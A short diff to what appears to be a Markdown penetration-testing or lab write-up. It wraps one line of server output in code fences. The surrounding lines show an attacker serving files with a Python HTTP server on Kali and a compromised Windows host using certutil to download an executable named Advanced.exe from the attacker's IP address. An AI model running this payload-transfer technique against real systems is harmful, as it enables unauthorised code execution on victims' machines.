@@ -410,7 +410,10 @@ d----         9/26/2019   8:18 AM            LiveUpdate
 
 ┌──(kali㉿kali)-[~] <br>
 └─$ python3 -m http.server 80
+
+```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... <br>
+```
 
 PS > certutil -urlcache -f http://192.168.175.163:80/Advanced.exe Advanced.exe
 
